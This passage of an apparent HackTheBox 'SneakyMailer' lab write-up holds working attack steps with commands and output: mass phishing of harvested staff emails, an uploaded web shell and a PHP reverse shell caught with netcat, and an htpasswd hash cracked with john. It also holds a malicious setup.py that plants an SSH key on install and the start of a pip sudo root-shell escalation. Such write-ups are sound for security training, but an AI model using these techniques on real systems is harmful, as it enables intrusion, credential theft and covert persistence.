cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 45.92 seconds</span><br></pre></td></tr></table></figure><p>We have a few interesting port open, two HTTP port on 80 and a <code>nginx</code> proxy on port 8080.</p><p>Opening <a href="http://sneakymailer.htb/">http://sneakymailer.htb</a> redirect to <a href="http://sneakycorp.htb/">http://sneakycorp.htb</a> which displays the following page:</p><img width="976" alt="sneakymailer homepage" src="https://user-images.githubusercontent.com/9076747/87946333-29061a80-caa2-11ea-931c-7a4e55248052.png"><p>We get a few interesting informations, stating that a <code>POP3</code> and <code>SMTP</code> are complete and that it’s possible to install Python <code>pip</code> module on the servers.</p><p>The “Team” page allows us to list users and their emails address:</p><img width="1127" alt="sneakymailer team page" src="https://user-images.githubusercontent.com/9076747/87947836-2f959180-caa4-11ea-92dc-f70a71a3a0fa.png"><p>Let’ continue our recon, the homepage state Python package can be installed to the server, yet we didn’t find any mentions of <code>pipy</code> or some kind of module. Let’s run <code>gobuster</code> in <code>vhost</code> mode to see if any Virtual Host exist that can be interesting: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster vhost -u sneakycorp.htb -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.sneakycorp.htb (Status: 200) [Size: 13742]</span><br></pre></td></tr></table></figure><p>We got a <code>dev</code> version of the website, opening it display the exact same site but with a register function added at <code>http://dev.sneakycorp.htb/pypi/register.php</code>.</p><p>While registering doesn’t seems to do anything the URL let us guess it’s a package installed with <code>pypi</code>. Let’s move on.</p><p>Seeing all the emails addresses we have available, port 25 SMTP open and the name of the box it might be a good start to try phishing some users to get their credentials.</p><h3 id="Extract-users-email-list"><a href="#Extract-users-email-list" class="headerlink" title="Extract users email list"></a>Extract users email list</h3><p>First let’s go back to the main site and extract all the user emails, we can use <code>cewl</code> for this task.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ./cewl.rb -e --email_file sneaky-emails.txt http://sneakycorp.htb/team.php</span><br><span class="line">[hg8@archbook ~]$ cat sneaky-emails.txt</span><br><span class="line">airisatou@sneakymailer.htb</span><br><span class="line">angelicaramos@sneakymailer.htb</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Phishing-through-SMTP"><a href="#Phishing-through-SMTP" class="headerlink" title="Phishing through SMTP"></a>Phishing through SMTP</h3><p>Given the fact we are in a CTF scenario there is probably no need to create a real phishing page (even though it wouldn’t be hard). To start off let’s try to send a simple link to users by emails and see if anything connect back to it.</p><p>Let’s open our listener on port 80:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">[sudo] password <span class="keyword">for</span> hg8:</span><br></pre></td></tr></table></figure><p>We have plenty of solutions to send SMTP, I will go with a simple way using <a href="https://www.jetmore.org/john/code/swaks/"><code>swaks</code></a>  in a little bash script.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> email; <span class="keyword">do</span></span><br><span class="line">  swaks --to <span class="variable">$email</span> --from admin@sneakymailer.htb --header <span class="string">&quot;Subject: Please login to my phishing site&quot;</span> --body <span class="string">&quot;Here -&gt; http://10.10.14.7/&quot;</span> --server 10.10.10.197</span><br><span class="line"><span class="keyword">done</span> &lt;sneaky-emails.txt </span><br></pre></td></tr></table></figure><p>After a little wait Paul bite the bait:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo nc -lvnp 80</span><br><span class="line">Connection from 10.10.10.197:47314</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 10.10.14.7</span><br><span class="line">User-Agent: python-requests/2.23.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 185</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt</span><br></pre></td></tr></table></figure><p>Let’s urldecode the password using Python:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python</span><br><span class="line">Python 3.8.3 (default, May 17 2020, 18:15:42)</span><br><span class="line">&gt;&gt;&gt; import urllib.parse</span><br><span class="line">&gt;&gt;&gt; urllib.parse.unquote(<span class="string">&quot;%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&quot;</span>)</span><br><span class="line"><span class="string">&#x27;^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&#x27;</span></span><br></pre></td></tr></table></figure><p>We got the following credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paulbyrd@sneakymailer.htb:^(<span class="comment">#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</span></span><br></pre></td></tr></table></figure><p>We don’t have any entry points so far except SMPT so let’s login to Paul account to see if we can find interesting emails. To do so we can use <code>evolution</code> (<code>apt install evolution gamin</code>). </p><p>Since I don’t have GUI on my CTF/Pentest box I gave a try to HackTheBox <a href="https://www.hackthebox.eu/home/pwnbox">pwnbox</a> which was quite nice and perfect to use for this kind of scenarios.</p><p>We configure Paul account with the informations we got:</p><img width="801" alt="sneakymailer smtp connection" src="https://user-images.githubusercontent.com/9076747/89170852-8c06af80-d580-11ea-80db-452748f03799.png"><p>Upon synchronisation we find an interesting email in the Sent folder:</p><blockquote><p>From: Paul Byrd <a href="mailto:&#112;&#x61;&#117;&#x6c;&#98;&#121;&#x72;&#100;&#x40;&#x73;&#x6e;&#101;&#97;&#x6b;&#121;&#x6d;&#x61;&#x69;&#108;&#101;&#114;&#x2e;&#104;&#116;&#98;">&#112;&#x61;&#117;&#x6c;&#98;&#121;&#x72;&#100;&#x40;&#x73;&#x6e;&#101;&#97;&#x6b;&#121;&#x6d;&#x61;&#x69;&#108;&#101;&#114;&#x2e;&#104;&#116;&#98;</a><br>To: root &lt;root@debian&gt;<br>Subject: Password reset<br>Date: Fri, 15 May 2020 13:03:37 -0500 </p><p>Hello administrator, I want to change this password for the developer account  Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C  Please notify me when you do it</p></blockquote><h3 id="Access-FTP-Dev-server"><a href="#Access-FTP-Dev-server" class="headerlink" title="Access FTP Dev server"></a>Access FTP Dev server</h3><p><code>nmap</code> scan revealed open FTP port. Now that we have a developper credential maybe we can login to it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp sneakymailer.htb</span><br><span class="line">Connected to sneakymailer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (sneakymailer.htb:hugo): developer</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p>Bingo, we have access to what seems to be the development website we found earlier (<code>http://dev.sneakycorp.htb</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxr-x    8 0        1001         4096 Jun 30 01:15 dev</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> dev</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 css</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 img</span><br><span class="line">-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php</span><br><span class="line">drwxr-xr-x    3 0        0            4096 May 26 19:52 js</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi</span><br><span class="line">drwxr-xr-x    4 0        0            4096 May 26 19:52 scss</span><br><span class="line">-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php</span><br><span class="line">drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor</span><br></pre></td></tr></table></figure><h3 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h3><p>With our FTP access we have the possibility to upload files. It’s the perfect scenario to upload a PHP Web Shell.<br>To generate the reserve shell I will use the excellent <a href="https://github.com/epinna/weevely3"><code>weevely</code></a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py generate h4ckTheB0x hg8.php</span><br><span class="line">Generated <span class="string">&#x27;hg8.php&#x27;</span> with password <span class="string">&#x27;h4ckTheB0x&#x27;</span> of 685 byte size.</span><br></pre></td></tr></table></figure><p>And upload it through FTP:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ftp sneakymailer.htb</span><br><span class="line">Connected to sneakymailer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (sneakymailer.htb:hugo): developer</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> dev</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put hg8.php</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Ok to send data.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">685 bytes sent <span class="keyword">in</span> 0.000195 seconds (3.35 Mbytes/s)</span><br></pre></td></tr></table></figure><p>We should now be able to connect to the web shell (still using <code>weevely</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python weevely.py http://dev.sneakycorp.htb/hg8.php h4ckTheB0x</span><br><span class="line"></span><br><span class="line">www-data@sneakymailer:/var/www/dev.sneakycorp.htb/dev $ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>Unfortunately a clean-up script seems to remove any file uploaded to the server, cutting our webshell connection. To circumvent this workflow let’s upload a PHP reserve shell opener instead (like this one for <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php.">example</a>).</p><p>Let’s open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Drop our new PHP file and call it to trigger the reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://dev.sneakycorp.htb/hg8.php</span><br></pre></td></tr></table></figure><p>And bingo we get a new connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.197:48434</span><br><span class="line">Linux sneakymailer 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux</span></span><br><span class="line">www-data@sneakymailer:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><h3 id="Pivot-www-data-gt-developer"><a href="#Pivot-www-data-gt-developer" class="headerlink" title="Pivot www-data -&gt; developer"></a>Pivot www-data -&gt; developer</h3><p>First let’s pivot to <code>developer</code> account (with the credentials we found earlier) since it have more privileges than <code>www-data</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@sneakymailer:/$ su - developer</span><br><span class="line">Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:~$ id</span><br><span class="line">uid=1001(developer) gid=1001(developer) groups=1001(developer)</span><br></pre></td></tr></table></figure><p>Looking at the <code>/home/</code> folder we can see that <code>low</code> have the <code>user.txt</code> flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@sneakymailer:/home/low$ ls -l</span><br><span class="line">ls -l</span><br><span class="line">total 8</span><br><span class="line">-rwxr-x--- 1 root low   33 Jul 18 05:53 user.txt</span><br><span class="line">drwxr-xr-x 6 low  low 4096 May 16 03:33 venv</span><br></pre></td></tr></table></figure><p>Let’s now start looking around for anything that could help us pivoting to <code>low</code> user.</p><h3 id="Pivot-developer-gt-low"><a href="#Pivot-developer-gt-low" class="headerlink" title="Pivot developer -&gt; low"></a>Pivot developer -&gt; low</h3><p>While searching in the <code>/var/www</code> folder we notice a subdomain we missed <code>pypi.sneakycorp.htb</code> subdomain:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/$ ls /var/www/</span><br><span class="line">dev.sneakycorp.htb  html  pypi.sneakycorp.htb  sneakycorp.htb</span><br></pre></td></tr></table></figure><p>Let’s add it to our hosts file and take a look:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://pypi.sneakycorp.htb/ -I</span><br><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Sat, 18 Jul 2020 11:56:25 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 185</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http://sneakycorp.htb</span><br></pre></td></tr></table></figure><p>Nothing there unfortunately, but maybe it’s on port <code>8080</code> returned earlier by <code>nmap</code> ?</p><img width="739" alt="pypi server" src="https://user-images.githubusercontent.com/9076747/89271579-33e1b300-d63d-11ea-88bc-4a765da8bb91.png"><p>This is interesting, we have a way to create and upload our own Python packages. </p><h3 id="Cracking-PyPi-server-htpasswd"><a href="#Cracking-PyPi-server-htpasswd" class="headerlink" title="Cracking PyPi server htpasswd"></a>Cracking PyPi server htpasswd</h3><p>Reading through the <a href="https://github.com/pypiserver/pypiserver#apache-like-authentication-htpasswd">documentation of <code>pypiserver</code></a> we find that it’s possible to protect package upload with an <code>.htpasswd</code> authentification.</p><p>Indeed while searching the folder we find it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 root root     4096 May 15 14:29 .</span><br><span class="line">drwxr-xr-x 6 root root     4096 May 14 18:25 ..</span><br><span class="line">-rw-r--r-- 1 root root       43 May 15 14:29 .htpasswd</span><br><span class="line">drwxrwx--- 2 root pypi-pkg 4096 Jun 30 02:24 packages</span><br><span class="line">drwxr-xr-x 6 root pypi     4096 May 14 18:25 venv</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:/var/www/pypi.sneakycorp.htb$ cat .htpasswd</span><br><span class="line">pypi:$apr1$RV5c5YVs<span class="variable">$U9</span>.OTqF5n8K4mxWpSSR/p/</span><br></pre></td></tr></table></figure><p>Let’s run <code>john</code> on this hash to see if we can find the password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt pypihash                       Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])</span><br><span class="line">soufianeelhaoui  (pypi)</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo we got credentials to install python package remotely to the server: <code>pypi</code>:<code>soufianeelhaoui</code>.</p><h3 id="Creating-malicious-Python-Package"><a href="#Creating-malicious-Python-Package" class="headerlink" title="Creating malicious Python Package"></a>Creating malicious Python Package</h3><p>Now that we have the credentials and access to the PyPi server let’s create and upload a simple malicious package.</p><p>An easy way to use it to pivot to <code>low</code> user would be to add our SSH key its <code>authorized_key</code> file.</p><p>Following the documentation on <a href="https://pypi.org/project/pypiserver/#upload-with-setuptools">PyPi server</a> we can create the following <code>setuptools</code>:</p><blockquote><p>Setuptools is a fully-featured, actively-maintained, and stable library designed to facilitate packaging Python projects.</p></blockquote><p>First let’s create our <code>.pypirc</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers = <span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">[<span class="built_in">local</span>]</span><br><span class="line">repository: http://pypi.sneakycorp.htb:8080</span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure><p>Then the malicious <a href="https://docs.python.org/3/distutils/setupscript.html"><code>setup.py</code></a>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/low/.ssh/authorized_keys&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="string">&quot;\nssh-rsa AAAAB3NXXXXO2E= hg8@htb.htb&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">setuptools.setup(</span><br><span class="line">name=<span class="string">&quot;hg8&quot;</span>,</span><br><span class="line">version=<span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">author=<span class="string">&quot;hg8.sh&quot;</span>,</span><br><span class="line">author_email=<span class="string">&quot;hello@hg8.sh&quot;</span>,</span><br><span class="line">description=<span class="string">&quot;A small example package&quot;</span>,</span><br><span class="line">url=<span class="string">&quot;https://github.com/pypa/sampleproject&quot;</span>,</span><br><span class="line">packages=setuptools.find_packages(),</span><br><span class="line">classifiers=[</span><br><span class="line"><span class="string">&quot;Programming Language :: Python :: 3&quot;</span>,</span><br><span class="line"><span class="string">&quot;License :: OSI Approved :: MIT License&quot;</span>,</span><br><span class="line"><span class="string">&quot;Operating System :: OS Independent&quot;</span>,</span><br><span class="line">],</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>Let’s upload both files on the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/tmp/.hg8$ wget 10.10.14.15:8000/.pypirc</span><br><span class="line">‘.pypirc’ saved [128/128]</span><br><span class="line"></span><br><span class="line">developer@sneakymailer:/tmp/.hg8$ wget 10.10.14.15:8000/setup.py</span><br><span class="line">‘setup.py’ saved [1138/1138]</span><br></pre></td></tr></table></figure><p>To have our <code>.pypirc</code> taken in account we have to change the <code>$HOME</code> environment variable to our own folder:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:/tmp/.hg8$ HOME=$(<span class="built_in">pwd</span>)</span><br><span class="line">developer@sneakymailer:~$ <span class="built_in">echo</span> <span class="variable">$HOME</span></span><br><span class="line">/tmp/.hg8</span><br></pre></td></tr></table></figure><p>Then we should be able to run the <a href="http://setup.py/">setup.py</a> script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">developer@sneakymailer:~$ python3 setup.py sdist upload -r <span class="built_in">local</span></span><br><span class="line">running sdist</span><br><span class="line">running egg_info</span><br><span class="line">creating hg8.egg-info</span><br><span class="line">writing hg8.egg-info/PKG-INFO</span><br><span class="line">writing dependency_links to hg8.egg-info/dependency_links.txt</span><br><span class="line">writing top-level names to hg8.egg-info/top_level.txt</span><br><span class="line">writing manifest file <span class="string">&#x27;hg8.egg-info/SOURCES.txt&#x27;</span></span><br><span class="line">reading manifest file <span class="string">&#x27;hg8.egg-info/SOURCES.txt&#x27;</span></span><br><span class="line">writing manifest file <span class="string">&#x27;hg8.egg-info/SOURCES.txt&#x27;</span></span><br><span class="line">warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md</span><br><span class="line"></span><br><span class="line">running check</span><br><span class="line">creating hg8-0.0.1</span><br><span class="line">creating hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying files to hg8-0.0.1...</span><br><span class="line">copying setup.py -&gt; hg8-0.0.1</span><br><span class="line">copying hg8.egg-info/PKG-INFO -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/SOURCES.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/dependency_links.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">copying hg8.egg-info/top_level.txt -&gt; hg8-0.0.1/hg8.egg-info</span><br><span class="line">Writing hg8-0.0.1/setup.cfg</span><br><span class="line">creating dist</span><br><span class="line">Creating tar archive</span><br><span class="line">removing <span class="string">&#x27;hg8-0.0.1&#x27;</span> (and everything under it)</span><br><span class="line">running upload</span><br><span class="line">Submitting dist/hg8-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080</span><br><span class="line">Server response (200): OK</span><br></pre></td></tr></table></figure><p>Looks like everything went fine, we should be able to login using our SSH key to <code>low</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb low@sneakymailer.htb</span><br><span class="line">Linux sneakymailer 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"></span><br><span class="line">Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105</span><br><span class="line">low@sneakymailer:~$ cat user.txt</span><br><span class="line">dxxxxxxxxxxxxxxxxxxxxxx3</span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The usual recon return an interesting sudo entry that can run command as root without password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">low@sneakymailer:/tmp$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> low on sneakymailer:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User low may run the following commands on sneakymailer:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/pip3</span><br></pre></td></tr></table></figure><h3 id="Pip-privilege-escalation"><a href="#Pip-privilege-escalation" class="headerlink" title="Pip privilege escalation"></a>Pip privilege escalation</h3><p>Let’s see on <a href="https://gtfobins.github.io/">GTFObins</a> if we can find a way to exploit <code>pip3</code> to get a shell or arbitrary file read/write in order to escalate our privileges to root.<br>Bingo, there is one way:</p><blockquote><p>If pip runs in privileged context it may be used to access the file system, escalate or maintain access with elevated privileges.<br><a href="https://gtfobins.github.io/gtfobins/pip/">https://gtfobins.github.io/gtfobins/pip/</a></p></blockquote><p>Let’s give it a try using the example provided to spawn a privileged interactive shell: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">low@sneakymailer:/tmp$ TF=$(mktemp -d)</span><br><span class="line">low@sneakymailer:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&#x27;)&quot;</span> 